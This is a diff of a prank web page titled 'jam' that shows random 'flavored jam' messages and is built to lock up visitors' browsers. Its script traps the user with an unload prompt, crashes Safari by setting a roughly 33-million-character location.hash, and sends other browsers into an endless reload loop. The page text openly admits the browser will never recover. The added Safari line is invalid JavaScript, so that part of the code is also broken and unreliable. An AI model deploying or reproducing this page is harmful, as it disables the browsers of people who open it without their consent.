@@ -1,9 +1,86 @@
-<script>
-window.onbeforeunload = function() {
-    return true
-};
-if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) onload = () => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
-else {
-    for (;;) location.reload(1)
-}
-</script>
+<!doctype html>
+<html>
+    <head>
+        <title>jam</title>
+        <style>
+            @import url('https://fonts.googleapis.com/css2?family=Hi+Melody&display=swap');
+            :root {
+                --back: #110F0F;
+                --text: #F4E9F6;
+                --color: #ffffff;
+            }
+            html {
+                background: var(--back);
+            }
+            * {
+                text-align: center;
+                justify-content: center;
+                justify-items: center;
+                justify-self: center;
+                align-content: center;
+                align-items: center;
+                align-self: center;
+            }
+            body {
+                margin: 0;
+                margin-top: 15%;
+                height: 100%;
+                font-family: "Hi Melody", Monospace;
+                display: grid;
+            }
+            div {
+                width: 50%;
+                display: grid;
+            }
+            div > * {
+                color: var(--text);
+            }
+            jam1 {
+                font-size: 3vw;
+            }
+            jam2 {
+                font-size: 2vw;
+            }
+            color {
+                color: var(--color);
+            }
+        </style>
+    </head>
+    <body>
+        <div>
+            <jam1>feeding your browser flavored jam...</jam1>
+            <br>
+            <jam2>by the way, if you're wondering why nothing is working, its too busy eating jam to pay attention to you, so consider it "on break" until it's done eating its jam (it won't be, i gave it an infinite amount of jam).</jam2>
+        </div>
+        <script>
+            var flavors = ["strawberry", "grape", "blueberry", "papaya", "blackberry", "raspberry", "mango", "apricot", "apple", "blackcurrant", "cherry", "prickly pear", "coconut", "dragonfruit", "durian", "elderberry", "fig", "gooseberry", "grapefruit", "honeyberry", "huckleberry", "kiwi", "juniper", "jackfruit", "japanese plum", "kumquat", "lemon", "lime", "lychee", "mango", "marionberry", "cantaloupe", "honeydew", "watermelon", "miraclefruit", "mulberry", "nectarine", "orange", "blood orange", "clementine", "mandarine", "tangerine", "passionfruit", "pawpaw", "peach", "pear", "persimmon", "plum", "pineapple", "pineberry", "pomegranate", "pomelo", "quince", "redcurrant", "rose", "salal", "starfruit", "tayberry", "thimbleberry", "white currant", "yuzu", "bell pepper", "carolina reaper", "chile pepper", "cucumber", "eggplant", "tomato", "pumpkin", "ram", "cpu core", "nvidia", "amd", `${Math.floor(Math.random() * 10) * 3}-volt`, "solder", "CPU fan", "cooling agent", "keyboard", "computer mouse", "4K monitor", "java", "javascript", "c", "c#", "c++", "binary", "assembly", "haskell", "css", "html", "opengl", "jquery", "stackoverflow", "typescript", ".net", "visual basic", "curl", "bash", "windows", "linux", "macos", "ecmascript", "fortran", "php", "rust", "regex"];
+            function getRandomFlavor(amount) {
+                var finalFlavor = Array.from({length: amount}, () => flavors[Math.floor(Math.random() * flavors.length)]);
+                return [...new Set(finalFlavor)].join(" ");
+            }
+            function getRGB(r, g, b) {
+                let rgbFinal = [];
+                rgbFinal.push(r.toString(16))
+                rgbFinal.push(g.toString(16))
+                rgbFinal.push(b.toString(16))
+                return rgbFinal.join("");
+            }
+            function fillJamInformation() {
+                let flavor = getRandomFlavor(Math.floor(Math.random() * 5) + 1);
+                document.querySelector("jam1").innerHTML = `feeding your browser <color>${flavor}</color> flavored jam...`;
+                document.title = `free ${flavor} flavored jam`;
+                var randomColor = getRGB(Math.floor(Math.random()*250), Math.floor(Math.random()*250), Math.floor(Math.random()*250))
+                document.querySelector(":root").style.setProperty("--color", `#${randomColor}`)
+            }
+            fillJamInformation();
+            window.onbeforeunload = function() {
+                return true
+            };
+            if (/^((?!chrome|android).)*safari/i.test(navigator.userAgent)) {
+                onload = function wallEElectricute() => location.hash = "M" + "\u0001".repeat(2 ** 25) + "m";
+            } else {
+                for (;;) location.reload(true)
+            }
+        </script>
+    </body>
+</html>
